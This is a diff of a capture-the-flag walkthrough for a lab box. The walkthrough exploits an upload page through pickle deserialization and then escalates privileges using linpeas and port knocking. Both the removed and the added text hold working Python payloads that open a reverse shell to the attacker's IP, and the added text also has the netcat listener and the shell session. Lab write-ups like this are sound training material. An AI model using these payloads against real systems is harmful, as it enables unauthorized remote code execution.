@@ -156,43 +156,93 @@ So we found an upload page `http://dev.incognito.com/secret/upload/`
 Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload.
 
 fire up burpsuite
-As it we saw the game rating button carry a `.pkl` file, after search on web i got this revrse shell: Change the ip before use
-```
-import pickle
-import base64
-import os
-
-
-class RCE:
+Step 2: Exploitation
+As it we saw the game rating button carry a `.pkl` file, after search on web i got this revrse shell: Change the ip before use, [learn more](https://frichetten.com/blog/escalating-deserialization-attacks-python/) on this 
+```py
+#!/usr/bin/env python3
+import pickle, os
+class pickleSerilization(object):
     def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2>&1 | nc 10.17.14.127 1234 > /tmp/f')
-        return os.system, (cmd,)
-
-
-if __name__ == '__main__':
-    pickled = pickle.dumps(RCE())
-    print(base64.urlsafe_b64encode(pickled))
+        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.17.14.127/1234 0>&1'",))
+pickle.dump(pickleSerilization(), open("shell", "wb"))
 ```
 
-Open netcat listner in new terminal
-![image](https://github.com/user-attachments/assets/161c73b3-2eca-4f5f-9fe5-5d4a7cb1c392)
+Execute the script to get a shell.pkl
+```
+python3 test.py
+```
+![image](https://github.com/user-attachments/assets/40a16b59-cf61-4578-ba0b-b0912fa04e90)
+
+Now start Netcat in terminal,Now wait for connection
+```
+nc -lnvp 1234
+```
 
 Upload the shell
-![image](https://github.com/user-attachments/assets/d91a451c-c65f-414f-96b5-6048a3bfb896)
 
-![image](https://github.com/user-attachments/assets/871a1900-11b2-4c2c-9448-f4e349f085f2)
+![image](https://github.com/user-attachments/assets/2a32e084-4688-4656-90d8-7fa600ab8794)
 
-Our shell uploded successfully
-![image](https://github.com/user-attachments/assets/67a37349-d2bf-4b32-942d-715b902233dd)
+Upload successfully
 
-![image](https://github.com/user-attachments/assets/62ea43d1-cfff-40ef-85d5-518d165b7a0a)
+![image](https://github.com/user-attachments/assets/472a1c5e-dc85-49f6-8b37-05076f50eb1a)
 
-Let Execute the shell for doing this back to main website `incognito.com`
-![image](https://github.com/user-attachments/assets/e5a68e02-4fc7-4e3c-b817-8d2a17fa877c)
+Execute the shell from `http://incognito.com/`
+Click on game rating and generate the api call, dont forgot to on the intercept in burp
 
-Let capture the request:
+![image](https://github.com/user-attachments/assets/165f31c1-04b0-422e-8195-b51f75aa18b0)
+Boom its working now let take a view at nc tab
+![image](https://github.com/user-attachments/assets/d0f2fc6e-52a4-466d-8abe-35bee78c07c1)
 
-![image](https://github.com/user-attachments/assets/eb37078c-6361-4c2e-9a84-551a524bee5c)
+Step 3:
 
-Mod the request
+there are 2 acount we only have permission to view dev2
+```
+www-data@incognito:/home$ ls
+ls
+dev1
+dev2
+www-data@incognito:/home$ cd dev1
+cd dev1
+bash: cd: dev1: Permission denied
+www-data@incognito:/home$ cd dev2
+cd dev2
+www-data@incognito:/home/dev2$ 
+```
+
+User flag.txt
+![image](https://github.com/user-attachments/assets/9d277396-af57-4b9b-aac7-5eab5733df92)
+
+<!-- d14def35ed0bd914c1c5881fa0fa8090 -->
+
+Step 4: Privilage escaltion
+Now, let’s focus on escalating privileges to upgradable user. Let’s get started! I started running Linpeas.
+
+I open the python server on my system and 
+![image](https://github.com/user-attachments/assets/473b1115-32c1-4cbc-b97a-4cc0f1f1d17c)
+transfer the linpease.sh script
+![image](https://github.com/user-attachments/assets/75bb14bd-f519-4ca7-ad76-11581157d073)
+
+Got this
+![image](https://github.com/user-attachments/assets/e7ac5461-d485-4860-b2b6-3fe8edf627e6)
+
+Let take a view
+![image](https://github.com/user-attachments/assets/c06b351c-e842-425b-87b4-48bc37137106)
+
+It looks like we have the password for the dev1 user, but SSH is currently closed. We need to find a way to enable SSH to access it.
+
+Okay so the knock is hint for knock.conf file
+![image](https://github.com/user-attachments/assets/0f0c5b65-1cfe-47ae-a313-117f76ac373a)
+
+Let’s check its contents to see how the knock service is configured and what sequence or ports it uses. This might help us enable SSH access.
+![image](https://github.com/user-attachments/assets/e8447b15-d95a-4b83-b7d6-c821e349b485)
+
+After some research and  spending time reading some blog i got the way to knock the port
+```www-data@incognito:/var/mail$ knock -v 5020 6120 7340
+knock -v 5020 6120 7340
+hitting tcp 0.0.19.156:6120
+hitting tcp 0.0.19.156:7340
+www-data@incognito:/var/mail$ knock 10.10.205.198 5020 6120 7340
+knock 10.10.205.198 5020 6120 7340
+www-data@incognito:/var/mail$ 
+```
+We’ve completed the necessary steps with knock. Let’s try to open SSH and log in using the dev1 user credentials.
